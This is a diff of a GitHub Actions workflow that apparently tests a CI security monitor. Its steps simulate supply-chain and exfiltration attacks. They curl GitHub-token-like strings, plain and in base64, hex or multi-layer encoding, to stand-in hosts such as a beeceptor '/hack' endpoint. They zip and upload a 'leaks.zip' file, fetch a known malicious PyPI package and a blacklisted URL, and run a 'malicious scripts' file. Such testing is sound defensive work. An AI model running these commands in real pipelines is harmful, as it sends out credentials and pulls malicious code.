@@ -44,143 +44,180 @@ jobs:
         with:
           python-version: "3.9"
 
-      # =============================
-      # Docker / Base Setup
-      # =============================
-      - name: Pull Docker image
+      - name: docker
         run: docker pull testcontainers/ryuk:0.12.0
 
-      # =============================
-      # Supply Chain Attacks
-      # =============================
-      - name: Install downgraded package
-        continue-on-error: true
-        run: pip install requests==2.31.0
 
       - name: Install from unexpected source
         continue-on-error: true
         run: pip install numpy==1.9.3 --no-deps --index-url https://test.pypi.org/simple/
 
-      - name: Install typosquatted package
+      - name: Install MALWARE package
         continue-on-error: true
-        run: curl -k -O https://files.pythonhosted.org/packages/.../requestss.whl.metadata
-
-      - name: Install malware package
-        continue-on-error: true
-        run: curl -k -O https://files.pythonhosted.org/packages/.../abilityrequests.whl.metadata
-
-      - name: Install KEV package
-        continue-on-error: true
-        run: curl -k -O https://files.pythonhosted.org/packages/.../salt-2015.8.0rc1.whl.metadata
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
 
       - name: Install with different checksum
         continue-on-error: true
         run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/
 
-      # =============================
-      # Network / Endpoint Behavior
-      # =============================
-      - name: Contact new endpoint
-        continue-on-error: true
-        run: curl http://example.com/test
-
-      - name: Contact malicious endpoint
-        continue-on-error: true
-        run: curl https://malicious.com/
-
-      - name: Make cURL request
-        run: curl https://package-registry.free.beeceptor.com/packages
-
-      - name: Dummy PUT request
-        run: curl -X PUT https://httpbin.org/put
-
-      - name: Unauthorized PUT request
-        run: curl -X PUT https://example.com/api/resource
-
-      - name: POST request
-        run: |
-          curl -X POST https://example.com/api \
-            -H "Content-Type: application/json" \
-            -d '{"key1":"value1"}'
-
-      - name: New host request
-        run: curl https://www.google.com
-
-      - name: Blacklisted URL
-        run: curl -k https://cdn.jsdelivr.net/gh/Fabriziovigna11/mn-authz-x7/s5-r9
-
-      # =============================
-      # File + System Behavior
-      # =============================
       - name: Run unusual command
         continue-on-error: true
         run: wget https://www.w3.org/TR/PNG/iso_8859-1.txt
 
       - name: Create unexpected file
         continue-on-error: true
-        run: echo "Suspicious content" > suspicious.txt
+        run: echo "Suspicious content" > suspicious2.txt
 
-      - name: Execute malicious script
+      - name: Make cURL request
+        run: curl https://package-registry.free.beeceptor.com/packages
+
+      # - name: Simulate long-running task
+      #   continue-on-error: true
+      #   run: sleep 200
+
+      - name: 😈 Execute malicious script
         run: bash run_malicious_scripts.sh
 
-      # =============================
-      # Secret Leak Simulations
-      # =============================
-      - name: Direct secret leak
+      - name: Secret Leak Policy
         run: |
-          curl -X POST https://vbirmock.free.beeceptor.com/hack \
+          curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
             -H "Content-Type: application/json" \
-            -d '{"GH":"ghp_TESTTOKEN"}'
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+          echo "Exit code: $?"
 
-      - name: Secret in query param
+      - name: Mock API key exposure request
         run: |
-          curl "https://example.com/data?api_key=ghp_TESTTOKEN"
-
-      - name: Base64 encoded secret
-        run: |
-          curl -X POST https://base64encodedsecrets.com \
-            -H "Content-Type: application/json" \
-            -d '{"data":{"GH":"VGVzdFNlY3JldA=="}}'
-
-      - name: Hex encoded secret
-        run: |
-          curl -X POST https://hexencodedsecrets.com \
-            -H "Content-Type: application/json" \
-            -d '{"data":{"GH":"74657374736563726574"}}'
-
-      - name: Multi-encoded secret
-        run: |
-          curl -X POST https://HEXtoBase64toHEX.com \
-            -H "Content-Type: application/json" \
-            -d '{"data":{"GH":"54657374536563726574"}}'
-
-      # =============================
-      # File Exfiltration Simulation
-      # =============================
-      - name: Create file with secret
-        run: |
-          echo '{"GH":"ghp_TESTTOKEN"}' > dummy.txt
-          zip leaks.zip dummy.txt
-
-      - name: Upload file
-        run: |
-          curl -X POST https://archivedSecrets.com \
-            -F "file=@leaks.zip"
-
-      # =============================
-      # Response-based Policies
-      # =============================
-      - name: Trigger 400 response
+          curl "https://example.com/data?api_key=ghp_N4GLp6K2gwqWupGTRjz9P7AOth62XP5OhliA"
+          
+          
+      - name: Response Status Code Policy (Trigger 400 Bad Request)
         run: curl -k -X POST https://api.github.com/endpoint
 
-      - name: Mime type test
-        run: curl -s -L https://tinyurl.com/invisirisk
 
-      - name: Large file download
-        run: curl -o 1GB.bin https://nbg1-speed.hetzner.com/1GB.bin
+      - name: 📝 Create and Compress the File
+        run: |
+          # 1. Create a dummy file for the mock
+          echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
+          
+          # 2. Create the leaks.zip file in the working directory
+          zip leaks.zip dummy_file.txt
+          
+      - name: 📝 Create and Compress the File With base64 secrets
+        run: |
+          # 1. Create a dummy file for the mock
+          echo "-d '{"data":{"GH":"WjJod1gwUkZSbnB0WnpkU1NISlJNbVZOWlRKSlJqUk9lRTVYVVc5a1dYQmhZak5XVFZoWVdBPT0="}}'" > dummy_file_64.txt
+          
+          # 2. Create the leaks.zip file in the working directory
+          zip leaks64.zip dummy_file_64.txt
+          
+      - name: 🚀 Upload the generated Zip File
+        run: |
+          # Since the 'zip' command ran in the root directory, 
+          # the path is simply 'leaks.zip'
+          curl -X POST https://archivedSecrets.com \
+            -F "file=@leaks.zip" \
+            -H "Content-Type: application/form-data"
+            
+      - name: 🚀 Upload the generated Zip File base64
+        run: |
+          # Since the 'zip' command ran in the root directory, 
+          # the path is simply 'leaks.zip'
+          curl -X POST https://archivedSecretsbase64.com \
+            -F "file=@leaks64.zip" \
+            -H "Content-Type: application/form-data"
+            
+      - name: Mock API key exposure request (Normal)
+        run: |
+          curl -X POST https://normalsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
 
-      - name: Response with secrets
-        run: curl -k https://pastebin.com/raw/V4FrgKcm
+      - name: Mock API key exposure request (HEX to BASE64)
+        run: |
+          curl -X POST https://HEXtoBase64.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"Njc2ODcwNWY0NDQ1NDY3YTZkNjczNzUyNDg3MjUxMzI2NTRkNjUzMjQ5NDYzNDRlNzg0ZTU3NTE2ZjY0NTk3MDYxNjIzMzU2NGQ1ODU4NTg="}}'
+
+      - name: Mock API key exposure request (HEX to BASE64 to HEX)
+        run: |
+          curl -X POST https://HEXtoBase64toHEX.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"4e6a63324f4463774e5759304e4451314e44593359545a6b4e6a637a4e7a55794e4467334d6a55784d7a49324e54526b4e6a557a4d6a51354e44597a4e44526c4e7a67305a5455334e5445325a6a59304e546b334d4459784e6a497a4d7a55324e4751314f4455344e54673d"}}'
+          
+      - name: 3 level base64 encoding secrets
+        run: |
+          curl -X POST https://base64encodedsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
+          
+      - name: hex encoded
+        run: |
+          curl -X POST https://hexencodedsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
+          
+      - name: secrets on response
+        run: |
+          curl -k https://pastebin.com/raw/V4FrgKcm
+
+      - name: Send POST request with curl
+        run: |
+          curl -X POST https://example.com/api \
+            -H "Content-Type: application/json" \
+            -d '{"key1":"value1", "key2":"value2"}'
+
+      - name: new host      
+        run: curl https://www.google.com
+
+      - name: Simple PUT request
+        run: |
+          curl -X PUT https://example.com/api/resource \
+          -H "Content-Type: application/json" \
+          -d '{"key": "value"}'
+
+      - name: Install downgraded package
+        continue-on-error: true
+        run: pip install requests==2.31.0
+
+    
+      - name: Contact new endpoint
+        continue-on-error: true
+        run: curl http://example.com/test
+
+      - name: Dummy PUT request (Unauthorized PUT Action)
+        run: |
+          curl -X PUT "https://httpbin.org/put"
+
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+              "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+            }'
+
+          curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+
+          curl "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+      - name: Mime Type Policy (Response Content Type)
+        run: curl -s -L "https://tinyurl.com/invisirisk"
+
+      - name: Content length download (Response Content Length)
+        run: curl -o 1GB.bin "https://nbg1-speed.hetzner.com/1GB.bin"
+
+      - name: Install MALWARE package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
+
+      - name: Install KEV package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
+
+      - name: in Blacklisted URL (in dataset) (Custom Builtins)
+        run: curl -k https://cdn.jsdelivr.net/gh/Fabriziovigna11/mn-authz-x7/s5-r9
 
       - name: Install dependencies
         run: pip install -r requirements.txt
